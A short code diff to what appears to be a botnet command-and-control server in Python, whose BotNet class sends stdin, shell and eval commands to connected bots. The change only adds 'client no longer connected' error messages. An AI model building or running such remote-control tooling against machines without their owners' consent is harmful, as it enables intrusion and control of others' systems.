@@ -75,6 +75,8 @@ class BotNet(Thread):
             if user in self.allConnections:
                 self.allConnections[user].send(cmd, type="stdin")
                 return True
+            self.socketio.emit('response',
+                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
 
     def sendCmd(self, user, cmd):
@@ -82,6 +84,8 @@ class BotNet(Thread):
             if user in self.allConnections:
                 self.allConnections[user].send(cmd, type="cmd")
                 return True
+            self.socketio.emit('response',
+                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
 
     def sendEval(self, user, cmd):
@@ -89,6 +93,8 @@ class BotNet(Thread):
             if user in self.allConnections:
                 self.allConnections[user].send(cmd, type="eval")
                 return True
+            self.socketio.emit('response',
+                               {'stdout': '', 'stderr': 'Client {} no longer connected.'.format(user), 'user': user})
             return False
 
 
@@ -112,6 +118,7 @@ class BotServer(Thread):
             self.botnet.addConnection(user, Bot(clientsock, host_info))
 
             self.socketio.emit('connection', {'user': user}, namespace='/bot')
+
 
 class Bot:
     def __init__(self, sock, host_info):
